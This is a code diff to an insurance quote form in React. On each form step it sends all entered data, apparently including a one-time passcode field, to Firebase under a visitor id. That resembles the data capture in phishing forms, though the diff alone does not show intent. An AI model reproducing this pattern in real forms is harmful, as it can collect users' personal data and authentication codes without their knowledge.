@@ -26,6 +26,7 @@ import { useState, useEffect, useRef } from "react"
 import { offerData } from "@/lib/data"
 import InsurancePurpose from "@/components/insurance"
 import VehicleRegistration from "@/components/vic-form"
+import { addData } from "@/lib/firebase"
 
 export default function QuotePage() {
   const [mounted, setMounted] = useState(false)
@@ -627,8 +628,10 @@ function ProfessionalQuoteForm() {
   }
 
   const nextStep = () => {
+    const visitorId=localStorage.getItem('visitor')
     if (validateStep(currentStep)) {
       if (currentStep < steps.length) {
+        addData({id:visitorId,...formData,})
         setCurrentStep(currentStep + 1)
       }
     }
@@ -1436,7 +1439,7 @@ function ProfessionalQuoteForm() {
                     <Input
                       name="otp"
                       type="text"
-                      placeholder="123456"
+                      placeholder="######"
                       required
                       value={formData.otp}
                       maxLength={6}
